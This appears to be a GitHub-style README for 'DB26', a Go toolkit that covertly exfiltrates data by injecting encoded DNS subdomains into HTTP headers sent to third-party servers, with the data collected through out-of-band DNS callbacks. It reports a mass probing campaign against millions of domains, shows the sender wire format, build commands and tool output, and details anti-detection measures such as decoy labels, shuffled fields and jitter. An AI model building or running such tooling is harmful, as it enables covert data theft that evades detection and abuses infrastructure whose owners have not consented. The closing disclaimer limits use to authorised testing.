# DB26: DataBouncing Toolkit

**Indirect data exfiltration via HTTP header injection through third-party infrastructure.**

DataBouncing created by [John Carroll](https://thecontractor.io/data-bouncing/) and [David Mound](https://databouncing.io) — David was instrumental in the initial discovery. First tooling by [Nick Dunn](https://github.com/N1ckDunn/DataBouncing). This is a complete Go reimplementation with significant performance and operational improvements.

---

## What is DataBouncing?

DataBouncing exploits how web servers process HTTP headers. When a server receives a request with a crafted `Host`, `X-Forwarded-For`, `Referer`, or other header containing a subdomain, many servers will resolve that subdomain via DNS — creating an indirect channel for data exfiltration.

The data never travels directly between sender and receiver. It bounces through legitimate third-party infrastructure.

```
Sender                    Third-party                 Receiver
  │                        domain                       │
  │  HTTP GET /            ┌─────────┐                  │
  ├───────────────────────▶│ Server  │                  │
  │  Host: data.oob.domain │processes│                  │
  │                        │ header  │                  │
  │                        └────┬────┘                  │
  │                             │ DNS lookup             │
  │                             ▼                        │
  │                     ┌──────────────┐                │
  │                     │  Interactsh  │────────────────▶│
  │                     │  (OOB DNS)   │  DNS callback   │
  │                     └──────────────┘  with data      │
```

---

## Campaign Results

| Metric | Value |
|--------|-------|
| Probes sent | **35,065,138** |
| DNS callbacks | **153,664,396** |
| Unique proven candidates | **11,479,375** |
| Recruiter throughput | **700+ domains/sec** |
| Subfinder corpus | **9.8M subdomains** |
| Root domains covered | **8,915** |
| Exfiltration capacity (single use) | **~246 MB** |
| Reliable capacity (10x redundancy) | **~25 MB** |

---

## The Toolkit

### Recruiter — Candidate Discovery

Identifies which domains process which HTTP headers, creating a map of proven bounce points.

```
  ██████╗ ██████╗ ██████╗  ██████╗
  ██╔══██╗██╔══██╗╚════██╗██╔════╝
  ██║  ██║██████╔╝ █████╔╝███████╗
  ██║  ██║██╔══██╗██╔═══╝ ██╔═══██╗
  ██████╔╝██████╔╝███████╗╚██████╔╝
  ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝
  DataBouncing Recruiter

  Pre-flight Checks
  ─────────────────────────────────────────
   [PASS]  Domains file                 677021 domains
   [PASS]  Run directory                /root/db26/runs/final_corpus
   [PASS]  DNS resolution               ok
   [PASS]  Interactsh server            reachable
   [PASS]  interactsh-server            installed
   [PASS]  subfinder                    v2.13.0
   [PASS]  screen                       v4.09.01

[*] OOB domain: d6vcf...oob.yourdomain.com
[*] Starting 2000 workers at 5000 RPS...
[*] 5m | Sent: 175833 (473/s) | DNS: 756825 | Candidates: 84617
```

Features:
- 2000 concurrent goroutine workers
- Pre-flight dependency checks
- Config file for persistent settings
- Structured JSONL output per run
- Real-time log parsing for callbacks

Output: `databouncing_candidates.jsonl`
```json
{"domain":"example.com","headers":{"host":3,"xff":1},"callbacks":4}
```

### Sender (db26-send) — Encrypted Data Transmission

Takes the recruiter's proven candidates and uses them to exfiltrate data.

```
  ██████╗ ██████╗ ██████╗  ██████╗  ███████╗███████╗███╗  ██╗██████╗
  ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚══════╝╚══════╝╚═╝  ╚══╝╚═════╝
  DataBouncing Sender

  Session key:    Argon2id derived
  Field lengths:  fileID=5, seq=6, total=11
  Salt:           <SESSION_SALT>

  Input:          message.txt (554 bytes)
  Encrypted:      582 bytes
  FileID:         e1ba
  Chunks:         25 × 25 bytes max

  Candidates:     500 domains, 500 channels
  Retries:        10x per chunk
  Decoy rate:     20%

  Sending 25 chunks × 10 retries = 250 requests

  [250/250] 100% at 1/s | errors: 0

  Send Complete
  ════════════════════════════════════════
  Chunks:     25 (sent 250 total with retries)
  Errors:     0
  Duration:   3m32s
```

Features:
- AES-256-GCM encryption with Argon2id key derivation
- Base32 encoding (RFC 4648) for DNS-safe labels
- **Shuffled field order** — 24 permutations per query
- **Decoy labels** — random garbage injected to defeat pattern matching
- **Session-variable field lengths** — derived from key, change every run
- **Multi-domain spread** — chunks distributed across multiple OOB domains
- **Proven header routing** — only uses headers validated by the recruiter
- Manual target support: `-target adobe.com,host`
- Random jitter, random candidate selection, random chunk ordering

Wire format (field order randomised each query):
```
[fileID].[seq].[total].[base32data].[DECOY?].[corrID].[oob.domain]
```

### Receiver (db26-recv) — Collection and Reassembly

Reads the interactsh server log, deshuffles fields, reassembles the file.

```
  ██████╗ ██████╗ ██████╗  ██████╗  ██████╗ ███████╗ ██████╗██╗   ██╗
  ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═══╝
  DataBouncing Receiver

[*] Session key derived
[*] Field lengths: fileID=5, seq=6, total=11
[+] New file detected: e1ba (25 total chunks)
[+] File e1ba complete! (25/25 chunks)

  File e1ba
  ════════════════════════════════════════
  Chunks:    25 / 25
  Size:      554 bytes
  Checksum:  af850616b64645e3 (VERIFIED)
  Output:    received/file_e1ba.dat
  Resolvers: 24 unique IPs

  Resolver Intelligence:
    172.x.x.x — Cloudflare CDN edge, London
    172.x.x.x — Cloudflare CDN edge, London
    ...24 Cloudflare edge nodes

  Status:    SUCCESS
```

Features:
- Parses shuffled fields by unique length (no fixed format)
- Discards decoy labels automatically
- Handles out-of-order chunk arrival
- Multi-domain collection (single log, all OOB domains)
- SHA-256 integrity verification
- IP intelligence enrichment (ASN, Geo, reverse DNS)
- Reports missing chunks for retransmission

---

## End-to-End Proof

```
$ diff original.txt received/file_e1ba.dat
$ echo $?
0
```

**Byte-for-byte identical.** The file was:
1. Encrypted (AES-256-GCM, Argon2id key)
2. Chunked (25 × 25 bytes)
3. Base32 encoded
4. Shuffled (random field order + decoy labels)
5. Bounced through 500 third-party domains via proven HTTP headers
6. Collected from 24 Cloudflare edge resolvers in London
7. Deshuffled, decoded, reassembled, decrypted
8. Checksum verified

No direct connection between sender and receiver. All traffic appeared as normal HTTP requests to legitimate domains.

---

## Anti-Detection

| Technique | Purpose |
|-----------|---------|
| Random field order | No static wire format signature |
| Decoy labels | Defeats label-count analysis |
| Session-variable lengths | Different key = different field sizes |
| Multi-domain OOB | Traffic spread, no single domain sees all |
| Random jitter | No timing pattern |
| Random candidate | No domain pattern |
| Random header | Different position per request |
| AES-256-GCM | Payload indistinguishable from random |
| Random chunk order | Not sequential, no sequence pattern |

---

## Improvements Over Original

| Feature | Nick Dunn's Tools | DB26 |
|---------|------------------|------|
| Language | Python + Bash | Go |
| Recruiter speed | ~50 domains/sec | **700+ domains/sec** |
| Concurrency | multiprocessing / GNU parallel | goroutine pool (2000+) |
| Encryption | Fernet | AES-256-GCM + Argon2id |
| Wire format | Fixed order | **Shuffled + decoys** |
| Multi-domain | No | **Yes** |
| Anti-detection | Minimal | **Comprehensive** |
| Pre-flight checks | No | **Full dependency validation** |
| Reporting | Basic | **JSONL structured output** |
| IP Intelligence | No | **ASN/Geo/rDNS enrichment** |
| Manual targets | No | **`-target domain,header`** |

---

## Building

```bash
go build -o recruiter ./cmd/recruiter/
go build -o db26-send ./cmd/db26-send/
go build -o db26-recv ./cmd/db26-recv/
```

See [GUIDE.md](GUIDE.md) for full setup and usage instructions.

---

## Credits

- [DataBouncing](https://databouncing.io) created by [John Carroll](https://thecontractor.io/data-bouncing/) and [David Mound](https://databouncing.io)
- [Original article](https://thecontractor.io/data-bouncing/) by John Carroll (The Contractor)
- [First tooling implementation](https://github.com/N1ckDunn/DataBouncing) (Python) by Nick Dunn

- [Interactsh](https://github.com/projectdiscovery/interactsh) by ProjectDiscovery
- [Subfinder](https://github.com/projectdiscovery/subfinder) by ProjectDiscovery

---

## Disclaimer

This toolkit is for authorized security research, penetration testing, and educational purposes only. Only use against systems you have explicit permission to test. The authors are not responsible for misuse.
